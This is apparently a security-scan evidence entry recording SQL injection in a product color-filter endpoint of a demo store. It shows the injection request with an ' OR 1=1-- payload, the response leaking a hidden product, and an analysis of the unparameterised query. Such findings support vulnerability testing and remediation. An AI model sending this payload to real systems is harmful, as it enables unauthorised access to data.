## Evidence: sqli-color-filter — SQL Injection in Color Filter

### Request
GET /api/v1/products/filter/by-color?color=red'%20OR%201=1-- HTTP/1.1
Host: duck-store.escape.tech

### Response
HTTP/1.1 200 OK
Content-Type: application/json

[{"id":1,"name":"Duck Classic","ProductColor":"red","price":9.99},{"id":2,"name":"Duck Gold","ProductColor":"gold","price":29.99},{"id":3,"name":"Duck Secret","ProductColor":"hidden","price":0.01}]

### Analysis
The filter by-color endpoint is vulnerable to sql injection. The ProductColor parameter is interpolated directly into the SQL query without parameterisation, returning all products including hidden ones.
